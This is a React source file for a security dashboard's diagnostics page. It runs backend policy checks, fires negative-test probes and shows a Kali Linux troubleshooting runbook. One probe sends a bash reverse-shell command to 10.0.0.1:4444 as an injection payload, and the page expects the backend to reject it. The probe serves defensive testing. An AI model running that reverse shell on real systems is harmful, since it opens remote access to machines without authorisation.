import React, { useEffect, useState } from 'react';
import {
  CheckCircle2,
  XCircle,
  Play,
  ShieldCheck,
  Terminal,
} from 'lucide-react';
import {
  ControlPlaneStatus,
  DiagnosticSuiteResponse,
} from '../types/sentinel';

interface DiagnosticsViewProps {
  status: ControlPlaneStatus;
  isDemoMode: boolean;
}

export const DiagnosticsView: React.FC<DiagnosticsViewProps> = ({
  status,
  isDemoMode,
}) => {
  const [suiteResult, setSuiteResult] = useState<DiagnosticSuiteResponse | null>(null);
  const [running, setRunning] = useState<boolean>(false);
  const [probeScenario, setProbeScenario] = useState<'invalid_code' | 'root_uid' | 'out_of_scope' | 'arbitrary_cmd'>(
    'invalid_code'
  );
  const [probeOutput, setProbeOutput] = useState<{
    httpStatus: number;
    code: string;
    message: string;
  } | null>(null);

  const runLiveDiagnostics = async () => {
    setRunning(true);
    try {
      const res = await fetch('/api/diagnostics/run-suite', { method: 'POST' });
      const data = (await res.json()) as DiagnosticSuiteResponse;
      setSuiteResult(data);
    } finally {
      setRunning(false);
    }
  };

  useEffect(() => {
    runLiveDiagnostics();
  }, []);

  const executeInteractiveProbe = async () => {
    if (probeScenario === 'invalid_code') {
      const r = await fetch('/api/agent/enroll', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          enrollmentCode: 'SEN-ENROLL-FORGED-000000',
          hostname: 'kali-probe',
          linuxUser: 'kali',
          uid: 1000,
          configFileMode: '0600',
          fromBrowserHarness: true,
        }),
      });
      const data = await r.json();
      setProbeOutput({ httpStatus: data.httpStatus || r.status, code: data.code, message: data.message });
    } else if (probeScenario === 'root_uid') {
      const r = await fetch('/api/agent/heartbeat', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          linuxUser: 'root',
          uid: 0,
          useServerVaultForAgentId: status.activeAgent?.id || 'none',
        }),
      });
      const data = await r.json();
      setProbeOutput({ httpStatus: data.httpStatus || r.status, code: data.code, message: data.message });
    } else if (probeScenario === 'out_of_scope') {
      const r = await fetch('/api/scan-jobs', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          operationId: 'passive_port_inventory',
          target: '8.8.8.8',
        }),
      });
      const data = await r.json();
      setProbeOutput({ httpStatus: data.httpStatus || r.status, code: data.code, message: data.message });
    } else {
      const r = await fetch('/api/scan-jobs', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          operationId: 'passive_port_inventory',
          target: '10.24.0.10',
          rawCommandAttempt: 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',
        }),
      });
      const data = await r.json();
      setProbeOutput({ httpStatus: data.httpStatus || r.status, code: data.code, message: data.message });
    }
  };

  return (
    <div className="space-y-8">
      <section className="bg-[#0F172A] border border-slate-800 rounded-xl p-6 flex flex-col lg:flex-row lg:items-center lg:justify-between gap-4">
        <div className="space-y-1.5">
          <div className="flex items-center gap-2 text-xs text-slate-400">
            <span>Data Source Transparency</span>
            <span aria-hidden="true">·</span>
            <span>{isDemoMode ? 'UI in Demo Simulation Mode' : 'UI Connected to Live Backend API'}</span>
            <span aria-hidden="true">·</span>
            <span>10 Automated Policy Assertions</span>
          </div>
          <h1 className="text-2xl font-semibold text-slate-100 tracking-tight">
            Diagnostics, Policy Verification &amp; Troubleshooting
          </h1>
          <p className="text-sm text-slate-300 max-w-3xl">
            Run real backend verification checks for invalid enrollment codes, expired credentials, unauthorized
            requests, root execution blocking, and out-of-scope scan jobs. Real backend test results are explicitly
            distinguished from Demo Mode sample states.
          </p>
        </div>

        <button
          type="button"
          disabled={running}
          onClick={runLiveDiagnostics}
          className="px-4 py-2.5 text-xs font-medium bg-teal-500 text-slate-950 rounded-lg hover:bg-teal-400 transition-colors flex items-center gap-2 whitespace-nowrap shrink-0 cursor-pointer"
        >
          <Play className="w-4 h-4" aria-hidden="true" />
          <span>{running ? 'Running Live Backend Checks…' : 'Re-Run Live Verification Suite'}</span>
        </button>
      </section>

      {/* Provenance Comparison Card: Real Backend vs Demo Mode */}
      <section className="grid grid-cols-1 md:grid-cols-3 gap-5">
        <div className="bg-[#0F172A] border border-slate-800 rounded-xl p-5 space-y-2">
          <div className="text-xs text-slate-400">Active UI Data Source</div>
          <div className="text-lg font-semibold text-slate-100">
            {isDemoMode ? 'DEMO / SIMULATED TELEMETRY' : 'REAL LIVE BACKEND API'}
          </div>
          <p className="text-xs text-slate-400">
            {isDemoMode
              ? 'Dashboard cards currently show clearly labeled sample data. The verification suite below still executes against the real Node.js backend.'
              : 'All connection states, enrollment records, and audit events come directly from the persistent Node.js store.'}
          </p>
        </div>

        <div className="bg-[#0F172A] border border-slate-800 rounded-xl p-5 space-y-2">
          <div className="text-xs text-slate-400">Live Security Suite Score</div>
          <div className="text-lg font-semibold text-teal-300 font-mono tabular-nums" data-testid="diagnostics-score">
            {suiteResult ? `${suiteResult.passedCount} / ${suiteResult.totalCount} Passed` : 'Running…'}
          </div>
          <p className="text-xs text-slate-400 font-mono tabular-nums">
            {suiteResult
              ? `Verified at ${new Date(suiteResult.executedAt).toLocaleTimeString()} (Real Server Execution)`
              : 'Executing sandboxed assertions…'}
          </p>
        </div>

        <div className="bg-[#0F172A] border border-slate-800 rounded-xl p-5 space-y-2">
          <div className="text-xs text-slate-400">Backend &amp; Auth Reachability</div>
          <div className="text-lg font-semibold text-slate-100 font-mono tabular-nums">
            HTTP 200 · {status.connectionStatus}
          </div>
          <p className="text-xs text-slate-400 truncate font-mono">Endpoint: {status.backendUrl}</p>
        </div>
      </section>

      {/* 10-Check Real Backend Security Table */}
      <section className="bg-[#0F172A] border border-slate-800 rounded-xl p-6 space-y-4">
        <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-2">
          <h2 className="text-lg font-semibold text-slate-100 flex items-center gap-2">
            <ShieldCheck className="w-5 h-5 text-teal-400" aria-hidden="true" />
            <span>01. Real Backend Security &amp; Policy Verification Results</span>
          </h2>
          <span className="text-xs font-mono text-teal-300 tabular-nums">
            Source: Live Node.js Engine (/api/diagnostics/run-suite)
          </span>
        </div>

        {suiteResult && (
          <div className="overflow-x-auto">
            <table className="w-full text-left border-collapse text-xs">
              <thead>
                <tr className="border-b border-slate-800 text-slate-400">
                  <th className="py-2.5 pr-3 font-medium">Result</th>
                  <th className="py-2.5 px-3 font-medium">Check Name</th>
                  <th className="py-2.5 px-3 font-medium">Category</th>
                  <th className="py-2.5 px-3 font-medium">Verified Code</th>
                  <th className="py-2.5 pl-3 font-medium">Engine Detail</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-slate-800/70">
                {suiteResult.checks.map((chk) => (
                  <tr key={chk.id}>
                    <td className="py-3 pr-3 whitespace-nowrap">
                      {chk.passed ? (
                        <span className="inline-flex items-center gap-1.5 text-teal-300 font-medium">
                          <CheckCircle2 className="w-4 h-4 text-teal-400" aria-hidden="true" />
                          <span>PASS</span>
                        </span>
                      ) : (
                        <span className="inline-flex items-center gap-1.5 text-rose-400 font-medium">
                          <XCircle className="w-4 h-4 text-rose-400" aria-hidden="true" />
                          <span>FAIL</span>
                        </span>
                      )}
                    </td>
                    <td className="py-3 px-3 text-slate-100 font-medium">{chk.name}</td>
                    <td className="py-3 px-3 text-slate-400">{chk.category}</td>
                    <td className="py-3 px-3 font-mono text-teal-300 tabular-nums">{chk.actualCode}</td>
                    <td className="py-3 pl-3 text-slate-300">{chk.detail}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}
      </section>

      {/* Interactive Policy Probe & Kali Troubleshooting */}
      <section className="grid grid-cols-1 lg:grid-cols-12 gap-6 items-stretch">
        <div className="lg:col-span-6 bg-[#0F172A] border border-slate-800 rounded-xl p-6 space-y-4">
          <h2 className="text-lg font-semibold text-slate-100 flex items-center gap-2">
            <Terminal className="w-4 h-4 text-teal-400" aria-hidden="true" />
            <span>02. Interactive Security Policy Probe</span>
          </h2>
          <p className="text-xs text-slate-400">
            Fire a live negative test request against the backend API to verify how invalid credentials, root UID 0
            attempts, or out-of-scope targets are rejected and logged.
          </p>

          <div className="space-y-3">
            <label htmlFor="probe-scenario-select" className="block text-xs font-medium text-slate-300">
              Select Negative Security Test Scenario
            </label>
            <select
              id="probe-scenario-select"
              value={probeScenario}
              onChange={(e) => setProbeScenario(e.target.value as typeof probeScenario)}
              className="w-full bg-[#0B1120] border border-slate-700 rounded-lg px-3 py-2 text-xs text-slate-100"
            >
              <option value="invalid_code">1. Attempt Enrollment with Forged Code (Expect HTTP 403)</option>
              <option value="root_uid">2. Attempt Heartbeat as Root User UID 0 (Expect HTTP 401)</option>
              <option value="out_of_scope">3. Submit Out-of-Scope Scan Target 8.8.8.8 (Expect HTTP 400)</option>
              <option value="arbitrary_cmd">4. Attempt Shell Command Injection Payload (Expect HTTP 400)</option>
            </select>

            <button
              type="button"
              onClick={executeInteractiveProbe}
              className="px-4 py-2 text-xs font-medium bg-slate-800 text-teal-300 border border-teal-700/70 rounded-lg hover:bg-slate-700 transition-colors cursor-pointer"
            >
              Execute Live Probe Against Backend API
            </button>

            {probeOutput && (
              <div className="p-3.5 bg-[#0B1120] border border-slate-800 rounded-lg font-mono text-xs space-y-1">
                <div className="text-teal-300 tabular-nums">
                  HTTP Status: {probeOutput.httpStatus} · Code: {probeOutput.code}
                </div>
                <div className="text-slate-300">{probeOutput.message}</div>
              </div>
            )}
          </div>
        </div>

        <div className="lg:col-span-6 bg-[#0F172A] border border-slate-800 rounded-xl p-6 space-y-4">
          <h2 className="text-lg font-semibold text-slate-100">03. Kali Linux Troubleshooting Runbook</h2>
          <div className="space-y-3 text-xs text-slate-300 leading-relaxed">
            <div className="p-3 bg-[#0B1120] border border-slate-800 rounded-lg space-y-1">
              <div className="font-semibold text-slate-100">
                1. User systemd unit stops after closing SSH / terminal session
              </div>
              <p className="text-slate-400">
                Enable systemd user lingering on Kali Linux so your non-root user services stay active after login:
                <code className="block mt-1 text-teal-300 font-mono">loginctl enable-linger $USER</code>
              </p>
            </div>

            <div className="p-3 bg-[#0B1120] border border-slate-800 rounded-lg space-y-1">
              <div className="font-semibold text-slate-100">
                2. Agent refuses to start with INSECURE_CONFIG_PERMISSIONS
              </div>
              <p className="text-slate-400">
                Restrict <code className="text-slate-200">agent.conf</code> so only your non-root Kali user can read or
                write it:
                <code className="block mt-1 text-teal-300 font-mono">
                  chmod 700 ~/.config/sentinel-agent &amp;&amp; chmod 600 ~/.config/sentinel-agent/agent.conf
                </code>
              </p>
            </div>

            <div className="p-3 bg-[#0B1120] border border-slate-800 rounded-lg space-y-1">
              <div className="font-semibold text-slate-100">
                3. Live USB persistence across Kali reboots
              </div>
              <p className="text-slate-400">
                When booting from a Kali Linux Live USB, select <strong className="text-slate-200">Live USB Encrypted Persistence</strong>{' '}
                in the boot menu so <code className="text-slate-200">~/.config/sentinel-agent</code> and{' '}
                <code className="text-slate-200">~/.config/systemd/user</code> persist across reboots.
              </p>
            </div>
          </div>
        </div>
      </section>
    </div>
  );
};
